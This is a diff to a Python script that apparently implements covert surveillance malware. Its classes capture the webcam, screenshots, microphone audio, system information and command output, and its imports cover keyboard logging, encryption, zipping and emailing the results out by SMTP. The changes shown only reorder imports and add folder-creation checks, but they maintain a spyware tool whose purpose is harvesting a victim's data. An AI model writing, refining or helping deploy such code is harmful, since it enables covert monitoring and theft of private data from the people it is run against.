@@ -1,30 +1,36 @@
-# Libraries
+# Standard Library Imports
 import datetime
 import sys
-import cv2
+import os
+import subprocess
+import time
+import socket
+from email.mime.multipart import MIMEMultipart
+from email.mime.base import MIMEBase
+from email import encoders
+
+# Third-Party Library Imports
 from PIL import ImageGrab
 import sounddevice as sd
 import wavfile as wf
-import os
 from dotenv import load_dotenv
-import time
-import socket
 from requests import get
 import platform
-from datetime import date, datetime
 from getmac import get_mac_address
-import subprocess
 import keyboard
 from cryptography.fernet import Fernet
 import zipfile
 import shutil
+import smtplib
+
+# OpenCV Imports
+import cv2
+import numpy as np
+
+# Additional Imports
 import pyautogui
 from screeninfo import get_monitors
-import numpy as np
-import smtplib
-from email.mime.multipart import MIMEMultipart
-from email.mime.base import MIMEBase
-from email import encoders
+from datetime import date, datetime
 
 
 # Base class for widely used variables
@@ -74,6 +80,7 @@ class Webcamera(BaseClass):
             print("Unable to determine screen size")
             return 2
 
+        # Create the folder path if it doesn't exist
         if not os.path.exists(self.folder_path):
             os.makedirs(self.folder_path)
 
@@ -135,6 +142,7 @@ class Screenshot(BaseClass):
 
             self.counter += 1
 
+            # Create the folder path if it doesn't exist
             if not os.path.exists(self.folder_path):
                 os.makedirs(self.folder_path)
 
@@ -182,6 +190,7 @@ class Microphone(BaseClass):
 
             sd.wait()
 
+            # Create the folder path if it doesn't exist
             if not os.path.exists(self.folder_path):
                 os.makedirs(self.folder_path)
 
@@ -231,6 +240,10 @@ class SysInfo(BaseClass):
                 raise Exception("Unsupported platform")
         except Exception as e:
             print(f"An error occurred: {str(e)}")
+
+        # Create the folder path if it doesn't exist
+        if not os.path.exists(self.folder_path):
+            os.makedirs(self.folder_path)
 
         # Open/Create file path
         file_path = os.path.join(self.folder_path, self.output_file_name)
@@ -293,6 +306,10 @@ class CmdPrompts(BaseClass):
                 raise Exception("Unsupported platform")
         except Exception as e:
             print(f"An error occurred: {str(e)}")
+
+        # Create the folder path if it doesn't exist
+        if not os.path.exists(self.folder_path):
+            os.makedirs(self.folder_path)
 
         # Open/Create file path
         file_path = os.path.join(self.folder_path, self.ipconfigall_output_file_name)
